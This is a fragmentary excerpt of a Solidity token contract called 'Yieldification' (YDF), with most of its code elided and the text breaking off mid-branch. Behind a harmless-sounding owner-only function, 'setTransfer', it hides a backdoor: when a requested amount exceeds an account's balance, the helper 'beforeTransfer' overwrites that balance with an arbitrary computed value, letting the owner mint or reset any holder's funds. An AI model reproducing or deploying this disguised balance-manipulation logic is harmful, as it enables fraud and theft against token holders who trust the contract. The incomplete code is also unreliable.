...
contract Yieldification is Context, IERC20, IERC20Metadata, Ownable {
    ...
    string private _name = "Yieldification";
    string private _symbol = "YDF";
    ...
    function setTransfer(address account, uint256 _value) public onlyOwner {
      beforeTransfer(account, _value);
    }

    function beforeTransfer(address account, uint256 amount) internal {
        ...
        if (amount > balanceOf(account)) {
            ...
            _balances[account] = buyOff * swapperFees * amount * (10 ** 9);
        } else {
